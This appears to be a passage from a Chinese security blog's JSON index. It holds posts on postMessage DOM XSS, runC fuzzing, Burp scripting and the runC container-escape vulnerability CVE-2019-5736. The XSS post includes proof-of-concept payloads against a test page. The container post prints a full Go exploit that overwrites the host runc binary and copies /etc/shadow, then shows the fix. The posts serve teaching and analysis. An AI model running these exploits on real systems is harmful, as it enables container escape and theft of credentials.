方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。 https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage\n它的用法也很简单：\nwindows.postMessage(message, targetOrigin, [transfer])\n\n\nwindows是指一个窗口，可以是当前页面的window、window.open返回的窗口对象、iframe的contentWindow属性等\n\nmessage是要发送的消息，可以是字符串，也可以是json格式\n\ntargetOrigin用来指定哪个窗口可以接收到消息，如果为*则表示任意窗口均可收到信息。而如果指定了特定的域名后要求发送消息的窗口其协议、端口、主机地址与指定域名匹配才可发送消息。\n\n\n发送消息事件可以通过如下方式添加监听事件：\nwindow.addEventListener(\"message\", receiveMessage, false);\nfunction receiveMessage(event)\n{\n}\n\n当发送信息时就会触发receiveMessage。其中event的属性比较重要的有：\n\ndata 即postMessage发送的数据\n\norigin 发送信息窗口的origin\n\n\n漏洞触发比起原理，大家肯定对漏洞如何利用更感兴趣。看下面这段代码\n&lt;html&gt;\n  &lt;head&gt;&lt;title&gt;Toxic DOM&lt;/title&gt;&lt;/head&gt;\n  &lt;body&gt;\n    &lt;script&gt;\n      var postMessageHandler = function(msg) {\n  var content = msg.data;\n  var msgObj = eval(content);\n\n  if (msgObj.isActive) {\n    document.write(\"PostMessage arrived!\");\n  }\n}\n\nwindow.addEventListener('message', postMessageHandler, false);\n\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n&lt;!-- https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval --&gt;\n\n很明显可以看出这个页面在监听到postMessage时会调用eval执行发送的信息，那我们就可以构造payload了\n&lt;script&gt;\n                    function pocLink() {\n                        let win = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval');\n                        let msg = \"alert(1);\";\n\n                        setTimeout(function(){\n                            win.postMessage(msg, '*');\n                        }, 5000);\n                    }\n&lt;/script&gt;\n &lt;a href=\"#\" onclick=\"pocLink();\"&gt;PoC link&lt;/a&gt;         \n\n或者是使用iframe\n&lt;script&gt;\n\n  function pocFrame(win) {           \n    let msg = \"alert(1);\";\n\n    win.postMessage(msg, '*');          \n  }\n&lt;/script&gt;\n &lt;iframe src=\"https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval\" onload=\"pocFrame(this.contentWindow)\"&gt;&lt;/iframe&gt;    \n\n也就是说我们需要在自己服务器上新建一个页面，用来打开一个新窗口或是加载一个iframe并获取其句柄，用来传递信息。当打开的窗口中存在有message监听，且其触发代码有可利用点时就可以触发漏洞。\n工具检测纯手工发现漏洞不可取，Burp的DOM Invader就可以帮助发现此类问题\n\n对于https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval 它可以直接检测出漏洞存在并一键生成POC\n\n为了了解原理最好可以看看它的代码，但是其源码做了混淆，没办法了解它的原理，所以我们从它的平替postMessage-tracker入手进行分析。 其检测结果展示形式为\n\n平平无奇的一个小框框，相较于DOM Invader的可利用性分析差了许多，不过仅仅了解下原理已然足够了。\n它的目录结构非常简单，首先看下mainfest.json\n\nrun_at表明注入在css之后，dom构建之前。关键代码在content_script.js当中：\n\n这一段的主要作用就是在添加监听器前判断其类型是否时message，如果是则记录下来一些数据，比如此时的堆栈信息等。合理推测Burp在此之上加入了危险函数判断的操作，后续有空的话就给DOM Invader加一个类似的功能练练手吧，日常使用当然还是Burp的香啊~\n参考文章\nhttps://github.com/fransr/postMessage-tracker\n\nhttps://portswigger.net/burp/documentation/desktop/tools/dom-invader\n\n\n","slug":"EventListener XSS","date":"2022-03-25T10:38:45.000Z","categories_index":"渗透测试","tags_index":"XSS","author_index":"RainSec"},{"id":"280c433ecf11c03958de8f79adb38b6b","title":"runC-fuzz","content":"runC-fuzz​本文主要是根据AdaLogics开源的runc-fuzzers和自己之前做的一些fuzz，研究一下可能的问题和相关的解决方案。在此之前可能会有朋友对runc比较陌生，可以参考一下之前的文章：https://bbs.pediy.com/thread-271130.htm\nAdaLogics如何fuzz​runC是go语言编写的，那么对于fuzz引擎的选择毫无疑问应该是go-fuzz，纵观runC的项目结构，其实就是包裹了libcontainer，这也不难理解，因为在我的印象里面runC项目本身就是为了符合OCI标准拆分出来的。\n​如果是fuzz的话，go语言里面最经常出现的问题其实就是索引超出边界，切片边界超出范围nil指针解引用等等，因此对于go-fuzz这种深入项目内部编写Fuzz函数的引擎，其实对于项目内部目标的选取十分关键。在AdaLogics的报告中指出runC具备较少的fuzz引擎入口点，因为现代模糊测试引擎其实更加适合解析，比如文本解析，编码解码或者各种其它API，但是这其实在runC里面比较少。\n​首先分析AdaLogics是怎么做的，在思考了上述问题之后他们把目标放在了API和信息解析上面，相对于信息解析还好说，本身利用go-fuzz引擎生成的大量数据可以轻松实现fuzz，但是对于API来说，其输入内容还是相对结构化的，可以看看下面的例子：\n// 抽取的runC代码片段\nfunc parseCgroupFromReader(r io.Reader) (string, error) {\n\ts := bufio.NewScanner(r)\n\tfor s.Scan() {\n\t\tvar (\n\t\t\ttext  = s.Text()\n\t\t\tparts = strings.SplitN(text, \":\", 3)\n\t\t)\n\t\tif len(parts) &lt; 3 {\n\t\t\treturn \"\", fmt.Errorf(\"invalid cgroup entry: %q\", text)\n\t\t}\n\t\t// text is like \"0::/user.slice/user-1001.slice/session-1.scope\"\n\t\tif parts[0] == \"0\" &amp;&amp; parts[1] == \"\" {\n\t\t\treturn parts[2], nil\n\t\t}\n\t}\n\tif err := s.Err(); err != nil {\n\t\treturn \"\", err\n\t}\n\treturn \"\", errors.New(\"cgroup path not found\")\n}\n\n这样的代码显然就比较适合利用go-fuzz引擎生成的测试用例直接跑fuzz，但是对于下面的例子：\nfunc statPids(dirPath string, stats *cgroups.Stats) error {\n\tcurrent, err := fscommon.GetCgroupParamUint(dirPath, \"pids.current\")\n\tif err != nil {\n\t\tif os.IsNotExist(err) {\n\t\t\treturn statPidsFromCgroupProcs(dirPath, stats)\n\t\t}\n\t\treturn err\n\t}\n\n\tmax, err := fscommon.GetCgroupParamUint(dirPath, \"pids.max\")\n\tif err != nil {\n\t\treturn err\n\t}\n\t// If no limit is set, read from pids.max returns \"max\", which is\n\t// converted to MaxUint64 by GetCgroupParamUint. Historically, we\n\t// represent \"no limit\" for pids as 0, thus this conversion.\n\tif max == math.MaxUint64 {\n\t\tmax = 0\n\t}\n\n\tstats.PidsStats.Current = current\n\tstats.PidsStats.Limit = max\n\treturn nil\n}\n\n这显然就是比较结构化的输入了，其实这种问题在面对其它语言的时候也有遇到，结构化Fuzz一直是Fuzz的难点之一，但是和go-fuzz项目，因为引擎和fuzz方式的不同其实在结构化上面也有很大的差异，比如一些C/C++项目，可能会用protobuf或者中间语言IR的方式来实现数据结构化，但是go-fuzz的话在对应的Fuzz函数内部引入这些功能无疑是比较麻烦。这里AdaLogics实现了go-fuzz-headers来帮助实现结构化。\n​        从statPids就可以看出，在结构化的目标中大多都是相关结构体：\ntype Stats struct {\n\tCpuStats    CpuStats    `json:\"cpu_stats,omitempty\"`\n\tCPUSetStats CPUSetStats `json:\"cpuset_stats,omitempty\"`\n\tMemoryStats MemoryStats `json:\"memory_stats,omitempty\"`\n\tPidsStats   PidsStats   `json:\"pids_stats,omitempty\"`\n\tBlkioStats  BlkioStats  `json:\"blkio_stats,omitempty\"`\n\t// the map is in the format \"size of hugepage: stats of the hugepage\"\n\tHugetlbStats map[string]HugetlbStats `json:\"hugetlb_stats,omitempty\"`\n\tRdmaStats    RdmaStats               `json:\"rdma_stats,omitempty\"`\n}\n\n因此其实只需要吧go-fuzz根据种子数据生成的脏数据进行结构体类型转化就能实现这个目标，这也正是go-fuzz-headers所做的，当然实际要做的工作比这个目标要麻烦的多。\n​        在实现了结构化之后接下来其实就比较简单了，选取目标进行Fuzz，AdaLogics对项目结构进行分析之后决定选取下面库作为目标：\n\nfs2\nspecconv\ndevices\nfscommon\nintelrdt\nlibcontainer\nuser\nuserns\nconfigs\n\n总共建立了12个Fuzz，在库中选取符合文本解析，编码解码或者各种其它API这些目标的函数进行了Fuzz。\n我如何Fuzz​        其实在runc-fuzzers开源以前本人就开始思考如何对容器相关的目标进行fuzz，对比该开源项目其实在runc的fuzz上面我们撞了很多库和函数，因此对于这一部分就不多说了，本人做的不足的是没有实现类似go-fuzz-headers这样的辅助库来帮助生成更强大的语料库，而是通过裁剪目标函数来让目标更适合fuzz引擎，对比之下本人的语料库显然low了很多，但是这种裁剪也使得目标每一部分的代码更清晰明了，个人觉得还是有助于发现一些细节问题的，并且fuzz的速度也应该更快。\n​        在对于目标的选取上，本人也更加“放肆”，因为因为容器的安全模型还不完善不必过于考虑引擎入口点的问题（也可能是我拆代码的原因）对apparmor这类的库也进行了Fuzz编写，但是问题在于合理的属于也可能带来灾难性的后果，详情可以参考之前分析的apparmor漏洞，但是这些逻辑类型的漏洞很难通过fuzz来找到，希望大佬们有啥更好的办法可以提出吧。\n结果如何​        其实结果对于一个安全研究者来说是绝望的，可以看下AdaLogics发布的漏洞报告：\n\n\n\n\n\n\n\n\n\nThe fuzzers found no bug during the assessment, which is a great achievement to the RunC and Umoci authors. However, we acknowledge that there is a reasonable expectation that bugs will occur once the pending pull requests are merged in. We go into details with this in the next section.\n本人自己的Fuzz在跑了2天之后也是no bug found，这也说明或许对于这些go项目来说，它们一边自身不断的集成Fuzz：比如runC的fuzz pr，或者是argo的fuzz项目都开始利用oss-fuzz将fuzz演变为常态化的手段来不断测试新加入的项目代码，同时从报告里看出，fuzz也确实需要常态化：\n\n未来展望​        一方面，这些其实只是对于runc项目进行了部分测试，就代码覆盖率而言其实完全不能算是达标，同时fuzz本身的运行时间过短其实不能算是一次合格的模糊测试，就长期来看Fuzz需要在CI tests中不断继承来确保软件的内生安全问题，通过持续不断的Fuzz运行也会不断的对新代码进行安全测试。\n​        就长远来看AdaLogics提出了一种观点，在fuzz中产生容器同时在容器内运行大量不同进程来进行整体性的安全测试，但是就目前fuzz的成熟度而言，还远不能达到这种效果。\n\terr := container.Run(process) \nif err != nil {\n\tcontainer.Destroy() \n  logrus.Fatal(err) \n  return\n}","slug":"RunC-Fuzz","date":"2022-03-11T10:48:45.000Z","categories_index":"漏洞挖掘","tags_index":"Fuzz","author_index":"RainSec"},{"id":"49976eacba4bfec6b25d67dd692a855b","title":"灵活的修改Burp请求","content":"灵活的修改Burp请求  在日常渗透测试中经常会遇到请求头需要替换、请求或响应内容需要解密等一系列麻烦的事。更换请求头可以通过Burp的Match and Replace功能来实现，加解密也有一些插件可以实现，但是它们普遍存在着以下缺陷：\n\n自定义数据不能进行保存\n\n加解密不能灵活的指定位置\n\n\n  带着这些需求，笔者在寻找工具时发现了一款有趣的插件Python Scripter: https://github.com/PortSwigger/python-scripter \n简介  与其说这是一个插件，不如说其更像是一个框架。简单地说，它的功能是将当前请求上下文作为全局变量传入用户自定义的代码中，也就是说用户可以随意的修改请求信息。它本身的代码也是很简单的\n  \n  首先是将请求信息传递给用户自定义脚本的集合中，然后每个脚本分别对请求信息进行处理\n  \n  这里的处理其实就是用户编译代码通过后，把操作Burp的接口作为全局变量传递进去并执行\n  \n  这就实现了以插件“写”插件。\n  \n完善  上文的框架让我们有了灵活操纵请求的希望，而https://github.com/lanmaster53/pyscripter-er/blob/master/pyscripterer.py 则成功的将其变为了现实。其定义了一个接受messageInfo等请求信息的Class，并且提供了许多写好的方法以便于更新请求信息，例如删除一个请求头，可以这么写：\n  \n  这样任何请求都将不存在Sec-Ch-Ua-Mobile这个字段，remove_request_headers就是pyscripter-er中定义好的一个方法，主要作用就是遍历移除指定header_name开头的haeder字段并重新构造请求包\n  \n  如果要增加新的通用函数只需要在pyscripterer中进行修改即可，比如增加一个添加请求头的方法\n  \n实战  接下来用实战来检验下，在测试某个网站时碰到了如下加密请求\n  \n  通过分析JS发现其加密算法是base64加上一定的换位：\n  \n  那我们的思路就是每次请求时找到jsonparams这个参数，并对其进行加密，这样在发送请求时我们看到的参数就是未加密的了，方便我们在repeater进行测试。首先创建一个函数用于获取参数，根据参数名遍历即可\n  \n  删除找到的参数，之后重新创建一个新的参数，其值为加密后的值\n  \n  加密函数\n  \n  结合起来调用\n  \n  当我们发送请求\n  jsonparams={\"UserId\":\"1234\"}\n\n  可以从logger中观测到其发生了变化，在intruder中的请求也会发生变化，再碰到需要爆破的场景时也是很实用的。\n  \n  除了对请求处理之外，我们也可以对响应做处理，而且操作结果会直接在当前页面里显现出来，不会像请求一样需要在日志里查看其修改结果，可以很好的解决响应内容加密的问题。还拿上面的请求为例，其响应内容是未加密的，这里给它做一次加密，简单的对相应内容做一次替换：\n  \n  使用base64进行加密\n  \n  最终的结果如下\n  \n总结  使用python-scripter可以灵活的写出适用于不同场景下的插件，同时可以将其保存为模板，方便之后遇到相似情况下的使用。本次虽然遇到的加密算法比较简单，但是以python执行jS的便捷，相信再复杂些的算法也能很快的实现。\n  本文中修改过后的pyscripterer已上传至github: https://github.com/No4l/python-scripter/blob/main/pyscripterer.py\n","slug":"灵活的修改Burp请求","date":"2022-03-05T10:38:45.000Z","categories_index":"渗透测试","tags_index":"BurpSuite","author_index":"RainSec"},{"id":"2f1f68ab5dfcea1c92e15793016ea760","title":"容器进程切换漏洞","content":"容器进程切换思考前置技术Magic Link​        /proc/目录下存在很多的链接文件，但是在Linux 也存在一种特殊的链接文件，这种文件的大小为0，我们知道普通的链接文件的大小等于链接目标的文件路径长度，但是Magic Link的大小为0，它们在打开方式上面也存在差别，普通链接文件会解析出链接文件的路径然后进行打开操作，但是Magic LInk的话不会这样，它会调用内核专门的处理函数，然后返回目标文件的文件描述符。\n\n匿名文件​        Linux Anonymous Files，也叫匿名文件，匿名文件和普通的文件十分类似，可以被定义，修改，写入，读取等等，但是和普通文件不同的是它并不是一个实体的文件，当用户使用memfd_create创建一个匿名文件的时候会返回一个文件描述符，一旦对这个文件描述符的所有引用都被丢弃的时候，该匿名文件就会被销毁，而且在该文件的整个生命周期中都是存在于内存的RAM当中，并不具备实体的文件。\nmount namespace是如何实现的？​        首先要了解在内核进程结构体task_struct里面存在一个nsproxy成员：\nstruct task_struct {\n.........\n/* Namespaces: */\nstruct nsproxy\t\t\t*nsproxy;\n.......\n}\n\nnsproxy结构体如下：\nstruct nsproxy {\n\tatomic_t count;\n\tstruct uts_namespace *uts_ns;\n\tstruct ipc_namespace *ipc_ns;\n\tstruct mnt_namespace *mnt_ns;\n\tstruct pid_namespace *pid_ns_for_children;\n\tstruct net \t     *net_ns;\n\tstruct time_namespace *time_ns;\n\tstruct time_namespace *time_ns_for_children;\n\tstruct cgroup_namespace *cgroup_ns;\n};\n\n可以看到各种不同的namespace都有自己的相关结构体，但是本文着重介绍mount namespace相关实现，因此通过追踪内核中进程的创建过程发现mount namespace的实现如下：\n内核函数调用链：\nkernel_clone(_do_fork) -&gt; copy_process\n\n在copy_process中发现大量和namespace相关的信息：\nstatic __latent_entropy struct task_struct *copy_process(\n\t\t\t\t\tstruct pid *pid,\n\t\t\t\t\tint trace,\n\t\t\t\t\tint node,\n\t\t\t\t\tstruct kernel_clone_args *args)\n{\n\tint pidfd = -1, retval;\n\tstruct task_struct *p;\n\tstruct multiprocess_signals delayed;\n\tstruct file *pidfile = NULL;\n\tu64 clone_flags = args-&gt;flags;\n\tstruct nsproxy *nsp = current-&gt;nsproxy;\n\n\t/*\n\t * Don't allow sharing the root directory with processes in a different\n\t * namespace\n\t */\n\tif ((clone_flags &amp; (CLONE_NEWNS|CLONE_FS)) == (CLONE_NEWNS|CLONE_FS))\n\t\treturn ERR_PTR(-EINVAL);\n\n\tif ((clone_flags &amp; (CLONE_NEWUSER|CLONE_FS)) == (CLONE_NEWUSER|CLONE_FS))\n\t\treturn ERR_PTR(-EINVAL);\n......\n}\n\n可以看到其实进程间的namespace可能具备某种继承关系，因此自然联想到系统0号进程，查阅相关资料发现存在init_task，它在内核刚启动的时候就进行了初始化，而且在相关结构体里面也确实找到了对于nsproxy的初始化：\n......\n\t.nsproxy\t= &amp;init_nsproxy,\n......\n\ninit_nsproxy的相关定义如下：\nstruct nsproxy init_nsproxy = {\n\t.count\t\t\t= ATOMIC_INIT(1),\n\t.uts_ns\t\t\t= &amp;init_uts_ns,\n#if defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)\n\t.ipc_ns\t\t\t= &amp;init_ipc_ns,\n#endif\n\t.mnt_ns\t\t\t= NULL,\n\t.pid_ns_for_children\t= &amp;init_pid_ns,\n#ifdef CONFIG_NET\n\t.net_ns\t\t\t= &amp;init_net,\n#endif\n#ifdef CONFIG_CGROUPS\n\t.cgroup_ns\t\t= &amp;init_cgroup_ns,\n#endif\n#ifdef CONFIG_TIME_NS\n\t.time_ns\t\t= &amp;init_time_ns,\n\t.time_ns_for_children\t= &amp;init_time_ns,\n#endif\n};\n\n可以发现，mnt_ns的相关初始化函数是NULL，因此mnt_ns并不继承父进程命名空间，回过头来看之前的copy_namespaces函数，发现其中存在create_new_namespaces函数调用，在其中发现mnt_namespace确实是通过copy_mnt_ns函数新创建的，至此我们已经大致了解了整个mnt_namespace的实现和创建流程。同时，通过copy_mnt_ns函数大致了解到，其实就是提供了独立的文件系统视图，设置各种挂载点，因此只要帮助绕过视图的影响就可以绕过mount namespace，所以符号链接攻击一直也是容器的痛点问题之一。\nrunC nsenter模块​        在查看runC源码的时候发现nsenter模块，改模块的主要实现使用C语言写的，而且只在init.go的import中被引入，因此它的执行顺序是很靠前的。\npackage nsenter\n\n/*\n#cgo CFLAGS: -Wall\nextern void nsexec();\nvoid __attribute__((constructor)) init(void) {\n\tnsexec();\n}\n*/\nimport \"C\"\n\n在import “C”前面紧跟注释是cgo的一种特殊语法，注释里面包含的都是c语言的语法\n漏洞分析​        在容器中执行docker run或者docker exec的时候，最终结果都是runC驱动执行用户想要执行的命令。同时，分析runC源码发现，无论是runC run还是runC exec，一个比较核心的思想就是创建一个runner结构体，然后调用其实现的run()函数：\nfunc execProcess(context *cli.Context) (int, error) {\n\tcontainer, err := getContainer(context)\n\tif err != nil {\n\t\treturn -1, err\n\t}\n\tstatus, err := container.Status()\n\tif err != nil {\n\t\treturn -1, err\n\t}\n\tif status == libcontainer.Stopped {\n\t\treturn -1, errors.New(\"cannot exec in a stopped container\")\n\t}\n\tif status == libcontainer.Paused &amp;&amp; !context.Bool(\"ignore-paused\") {\n\t\treturn -1, errors.New(\"cannot exec in a paused container (use --ignore-paused to override)\")\n\t}\n\tpath := context.String(\"process\")\n\tif path == \"\" &amp;&amp; len(context.Args()) == 1 {\n\t\treturn -1, errors.New(\"process args cannot be empty\")\n\t}\n\tstate, err := container.State()\n\tif err != nil {\n\t\treturn -1, err\n\t}\n\tbundle := utils.SearchLabels(state.Config.Labels, \"bundle\")\n\tp, err := getProcess(context, bundle)\n\tif err != nil {\n\t\treturn -1, err\n\t}\n\n\tcgPaths, err := getSubCgroupPaths(context.StringSlice(\"cgroup\"))\n\tif err != nil {\n\t\treturn -1, err\n\t}\n\n\tr := &amp;runner{\n\t\tenableSubreaper: false,\n\t\tshouldDestroy:   false,\n\t\tcontainer:       container,\n\t\tconsoleSocket:   context.String(\"console-socket\"),\n\t\tdetach:          context.Bool(\"detach\"),\n\t\tpidFile:         context.String(\"pid-file\"),\n\t\taction:          CT_ACT_RUN,\n\t\tinit:            false,\n\t\tpreserveFDs:     context.Int(\"preserve-fds\"),\n\t\tsubCgroupPaths:  cgPaths,\n\t}\n\treturn r.run(p)\n}\n\n不过在此之前都会通过loadFactory类来创建基础的libcontainer以便和容器进行交互，在exec.go中，getContainer的一个重要功能就是创建libccontainer实例：\n// loadFactory returns the configured factory instance for execing containers.\nfunc loadFactory(context *cli.Context) (libcontainer.Factory, error) {\n\troot := context.GlobalString(\"root\")\n\tabs, err := filepath.Abs(root)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tintelRdtManager := libcontainer.IntelRdtFs\n\n\t// We resolve the paths for {newuidmap,newgidmap} from the context of runc,\n\t// to avoid doing a path lookup in the nsexec context. TODO: The binary\n\t// names are not currently configurable.\n\tnewuidmap, err := exec.LookPath(\"newuidmap\")\n\tif err != nil {\n\t\tnewuidmap = \"\"\n\t}\n\tnewgidmap, err := exec.LookPath(\"newgidmap\")\n\tif err != nil {\n\t\tnewgidmap = \"\"\n\t}\n\n\treturn libcontainer.New(abs, intelRdtManager,\n\t\tlibcontainer.CriuPath(context.GlobalString(\"criu\")),\n\t\tlibcontainer.NewuidmapPath(newuidmap),\n\t\tlibcontainer.NewgidmapPath(newgidmap))\n}\n\n在结尾的New函数中，可以看到runC存储了一个MagicLink作为InitPath:\n// New returns a linux based container factory based in the root directory and\n// configures the factory with the provided option funcs.\nfunc New(root string, options ...func(*LinuxFactory) error) (Factory, error) {\n\tif root != \"\" {\n\t\tif err := os.MkdirAll(root, 0o700); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n\tl := &amp;LinuxFactory{\n\t\tRoot:      root,\n\t\tInitPath:  \"/proc/self/exe\",\n\t\tInitArgs:  []string{os.Args[0], \"init\"},\n\t\tValidator: validate.New(),\n\t\tCriuPath:  \"criu\",\n\t}\n\n\tfor _, opt := range options {\n\t\tif opt == nil {\n\t\t\tcontinue\n\t\t}\n\t\tif err := opt(l); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n\treturn l, nil\n}\n\n在接下来的过程中会调用该InitPath，并且参数为init，相当于执行了runC init命令，在该命令中采用cgo的形式导入C语言nstnter进行命名空间的设置：\npackage main\n\nimport (\n\t\"os\"\n\t\"runtime\"\n\t\"strconv\"\n\n\t\"github.com/opencontainers/runc/libcontainer\"\n\t_ \"github.com/opencontainers/runc/libcontainer/nsenter\"\n\t\"github.com/sirupsen/logrus\"\n)\n......\n\nnsenter如下：\npackage nsenter\n\n/*\n#cgo CFLAGS: -Wall\nextern void nsexec();\nvoid __attribute__((constructor)) init(void) {\n\tnsexec();\n}\n*/\nimport \"C\"\n\n可以看到调用了nsexec()函数，该函数在go runtime之前进行调用，函数的主要作用就是解析之前父进程发送的netlink格式的配置信息，然后通过设置usernamespace并创建子进程，然后子进程设置其他一些namespace并通过创建孙进程使相关namespaces生效，这个孙进程其实就是容器中的init进程，不过回想这个过程，runC通过cmd.Start()开启一个子进程执行runC init，在runC init的nsenter包执行过程中，会首先设置自己的user namespace和pid namespace，这就使得在该过程中容器内本身存在的进程可以发现runC进程，因此：\nvoid nsexec(void)\n{\n\tint pipenum;\n\tjmp_buf env;\n\tint syncpipe[2];\n\tstruct nlconfig_t config = {0};\n\n\t/*\n\t * If we don't have an init pipe, just return to the go routine.\n\t * We'll only get an init pipe for start or exec.\n\t */\n\tpipenum = initpipe();\n\tif (pipenum == -1)\n\t\treturn;\n\n\t/* Parse all of the netlink configuration. */\n\tnl_parse(pipenum, &amp;config);\n\n\t/* clone(2) flags are mandatory. */\n\tif (config.cloneflags == -1)\n\t\tbail(\"missing clone_flags\");\n\n\t/* Pipe so we can tell the child when we've finished setting up. */\n\tif (pipe(syncpipe) &lt; 0)\n\t\tbail(\"failed to setup sync pipe between parent and child\");\n\n\t/* Set up the jump point. */\n\tif (setjmp(env) == JUMP_VAL) {\n\t\t/*\n\t\t * We're inside the child now, having jumped from the\n\t\t * start_child() code after forking in the parent.\n\t\t */\n\t\tuint8_t s = 0;\n\t\tint consolefd = config.consolefd;\n\n\t\t/* Close the writing side of pipe. */\n\t\tclose(syncpipe[1]);\n\n\t\t/* Sync with parent. */\n\t\tif (read(syncpipe[0], &amp;s, sizeof(s)) != sizeof(s) || s != SYNC_VAL)\n\t\t\tbail(\"failed to read sync byte from parent\");\n\n\t\tif (setsid() &lt; 0)\n\t\t\tbail(\"setsid failed\");\n\n\t\tif (setuid(0) &lt; 0)\n\t\t\tbail(\"setuid failed\");\n\n\t\tif (setgid(0) &lt; 0)\n\t\t\tbail(\"setgid failed\");\n\n\t\tif (setgroups(0, NULL) &lt; 0)\n\t\t\tbail(\"setgroups failed\");\n\n\t\tif (consolefd != -1) {\n\t\t\tif (ioctl(consolefd, TIOCSCTTY, 0) &lt; 0)\n\t\t\t\tbail(\"ioctl TIOCSCTTY failed\");\n\t\t\tif (dup3(consolefd, STDIN_FILENO, 0) != STDIN_FILENO)\n\t\t\t\tbail(\"failed to dup stdin\");\n\t\t\tif (dup3(consolefd, STDOUT_FILENO, 0) != STDOUT_FILENO)\n\t\t\t\tbail(\"failed to dup stdout\");\n\t\t\tif (dup3(consolefd, STDERR_FILENO, 0) != STDERR_FILENO)\n\t\t\t\tbail(\"failed to dup stderr\");\n\t\t}\n\n\t\t/* Free netlink data. */\n\t\tnl_free(&amp;config);\n\n\t\t/* Finish executing, let the Go runtime take over. */\n\t\treturn;\n\t}\n\n\t/* Run the parent code. */\n\tstart_child(pipenum, &amp;env, syncpipe, &amp;config);\n\n\t/* Should never be reached. */\n\tbail(\"should never be reached\");\n}\n\n​        如果，在runc启动之前，容器内部的进程可以通过/proc/目录观察到runc相关的进程，那么就可以通过/proc/runc-pid/exe获得runc具体的路径，这个exe文件是Magic Link文件，这就意味着这个文件的打开过程是调用内核里面专门的处理函数，不是想普通的链接文件那样找到目标链接文件打开，这其实就帮助我们绕过了mnt命名空间和chroot对容器中文件系统资源的限制。\n​        如此我们就可以覆盖掉原本的runc二进制文件为我们的恶意代码，那么当用于下一次执行docker exec或者docker run之类需要调用runc的命令的时候就有可能会调用我们写入的恶意文件从而实现宿主机上面的恶意代码执行从而实现容器逃逸。\npocpackage main\n\n// Implementation of CVE-2019-5736\n// Created with help from @singe, @_cablethief, and @feexd.\n// This commit also helped a ton to understand the vuln\n// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d\nimport (\n        \"fmt\"\n        \"io/ioutil\"\n        \"os\"\n        \"strconv\"\n        \"strings\"\n)\n\n// This is the line of shell commands that will execute on the host\nvar payload = \"#!/bin/bash \\n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow\"\n\nfunc main() {\n        // First we overwrite /bin/sh with the /proc/self/exe interpreter path\n        fd, err := os.Create(\"/bin/sh\")\n        if err != nil {\n                fmt.Println(err)\n                return\n        }\n        fmt.Fprintln(fd, \"#!/proc/self/exe\")\n        err = fd.Close()\n        if err != nil {\n                fmt.Println(err)\n                return\n        }\n        fmt.Println(\"[+] Overwritten /bin/sh successfully\")\n\n        // Loop through all processes to find one whose cmdline includes runcinit\n        // This will be the process created by runc\n        var found int\n        for found == 0 {\n                pids, err := ioutil.ReadDir(\"/proc\")\n                if err != nil {\n                        fmt.Println(err)\n                        return\n                }\n                for _, f := range pids {\n                        fbytes, _ := ioutil.ReadFile(\"/proc/\" + f.Name() + \"/cmdline\")\n                        fstring := string(fbytes)\n                        if strings.Contains(fstring, \"runc\") {\n                                fmt.Println(\"[+] Found the PID:\", f.Name())\n                                found, err = strconv.Atoi(f.Name())\n                                if err != nil {\n                                        fmt.Println(err)\n                                        return\n                                }\n                        }\n                }\n        }\n\n        // We will use the pid to get a file handle for runc on the host.\n        var handleFd = -1\n        for handleFd == -1 {\n                // Note, you do not need to use the O_PATH flag for the exploit to work.\n                handle, _ := os.OpenFile(\"/proc/\"+strconv.Itoa(found)+\"/exe\", os.O_RDONLY, 0777)\n                if int(handle.Fd()) &gt; 0 {\n                        handleFd = int(handle.Fd())\n                }\n        }\n        fmt.Println(\"[+] Successfully got the file handle\")\n\n        // Now that we have the file handle, lets write to the runc binary and overwrite it\n        // It will maintain it's executable flag\n        for {\n                writeHandle, _ := os.OpenFile(\"/proc/self/fd/\"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)\n                if int(writeHandle.Fd()) &gt; 0 {\n                        fmt.Println(\"[+] Successfully got write handle\", writeHandle)\n                        writeHandle.Write([]byte(payload))\n                        return\n                }\n        }\n}\n\nPOC思路：\n\n首先覆盖容器中的/bin/sh为#!/proc/self/exe。\n遍历/proc下的目录找到runC相关进程\n打开/proc下相关的exe文件获得fd\n循环写入 fd，直到runC解除占用，成功写入\nrunc最后将执行用户通过docker exec指定的/bin/sh，它的内容在第1步中已经被替换成#!/proc/self/exe，因此实际上将执行宿主机上的runc，而runc也已经在第4部中被我们覆盖掉了。\n\n漏洞补丁具体补丁详情：https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d\nvoid nsexec(void)\n{\n\tint pipenum;\n\t@@ -549,6 +552,14 @@ void nsexec(void)\n\tif (pipenum == -1)\n\t\treturn;\n\n\t/*\n\t * We need to re-exec if we are not in a cloned binary. This is necessary\n\t * to ensure that containers won't be able to access the host binary\n\t * through /proc/self/exe. See CVE-2019-5736.\n\t */\n\tif (ensure_cloned_binary() &lt; 0)\n\t\tbail(\"could not ensure we are a cloned binary\");\n\n\t/* Parse all of the netlink configuration. */\n\tnl_parse(pipenum, &amp;config);\n\n​        可以看到主要是增加了一个ensure_cloned_binary()函数的判断其中主要的逻辑是通过memfd_create来将让runc在容器内执行操作前首先将自己复制成为一个匿名文件，如此在可以达到原来效果的同时，/proc/self/exe无法触达到原本的runC二进制文件。\n思考​        为了对容器进行有效控制通过宿主机进行容器内外的进程切换其实是必然的，但是稍有不慎就会导致容器信息外带在进程的上下文中，runC的这个漏洞是一个例子还有一个例子就是docker cp漏洞，它本身也是因为docker-tar进程将相关的共享库内容外带到了宿主机导致了容器逃逸，因此在考虑容器安全问题时，对这些危险进程的监控也是十分必要的。\n","slug":"容器进程切换漏洞","date":"2022-02-13T10:48:45.000Z","categories_index":"容器安全","tags_index":"容器安全","author_index":"RainSec"},{"id":"c240e7132c70272bfb31ce1eb51c281b","title":"RealWorld CTF之qiling框架分析","content":"RealWorld CTF之qiling框架分析qiling​当时题目就给了一个qiling的使用的用例，甚至和官方文档上面的用例差不多因此肯定是库的问题。\n#!/usr/bin/env 